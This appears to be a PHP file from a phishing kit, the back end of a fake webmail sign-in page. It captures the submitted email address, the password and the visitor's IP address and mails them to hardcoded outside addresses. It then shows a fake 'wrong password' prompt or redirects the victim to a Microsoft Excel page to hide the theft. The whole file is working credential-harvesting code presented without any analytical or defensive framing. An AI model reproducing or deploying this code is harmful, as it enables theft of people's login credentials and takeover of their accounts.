<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "webmail Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$try.= $_POST['try']+1;
$a = "index.php?email=".$_POST['user']."&try=0";
$b = "phone.php?email=".$_POST['user'];
$message .= "IP: ".$ip."\n";

$domain = substr($_POST['user'], strpos($_POST['user'], '@') + 1);
mail($recipient,$subject,$message);

$recipient = "resulter1000@protonmail.com, edeyshake247@gmail.com";
$subject = "Result!!!";
$headers = "From: webmail <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers))

{ 
	if($try==2) {     
	
		   echo "<script type='text/javascript'>alert('Wrong password. Please try again');
		   window.location='$a';
		   </script>";
}
	else {
		?>

		   <script language=javascript>
window.location='https://www.microsoft.com/en-us/microsoft-365/excel';
</script>
<?
	}

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>